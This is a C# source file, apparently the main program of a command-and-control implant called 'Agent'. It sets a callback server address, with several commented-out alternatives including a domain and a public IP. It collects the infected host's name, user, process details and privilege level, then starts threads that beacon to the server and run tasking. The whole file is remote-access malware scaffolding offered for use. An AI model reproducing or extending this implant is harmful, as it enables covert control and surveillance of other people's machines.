using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent
{
    class Program
    {

        private static AgentMetadata s_metadata;
        private static CommModule s_commModule;

        private static CancellationTokenSource s_tokenSource = new CancellationTokenSource();

        static void Main(string[] args)
        {
            string server = "10.0.2.10";
            int port = 443;
            string protocol = "https";


            //server = "gate.fropops.fr";
            //port = 443;
            //protocol = "https";

            //server = "13.38.61.75";
            //port = 80;
            //server = "127.0.0.1";
            //port = 8080;
            //server = "192.168.56.102";
            //port = 443;
            //protocol = "http";


            if (args.Length == 1)
            {
                var split = args[0].Split(':');
                protocol = split[0];
                server = split[1];
                port = Convert.ToInt32(split[2]);
            }

            GenerateMetadata();

            s_commModule = new HttpCommModule(protocol, server, port);
            var agent = new Models.Agent(s_metadata, s_commModule);

            Thread commThread = new Thread(s_commModule.Start);
            Thread agentThread = new Thread(agent.Start);
            commThread.Start();
            agentThread.Start();

            commThread.Join();
            agentThread.Join();
        }





        static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var userName = Environment.UserName;

            string integrity = "Medium";
            if (userName == "SYSTEM")
                integrity = "SYSTEM";

            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity.User != identity.Owner)
                {
                    integrity = "High";
                }
            }

            s_metadata = new AgentMetadata()
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName,
                UserName = userName,
                ProcessId = process.Id,
                ProcessName = process.ProcessName,
                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x68",
                Integrity = integrity,
            };

        }
    }
}
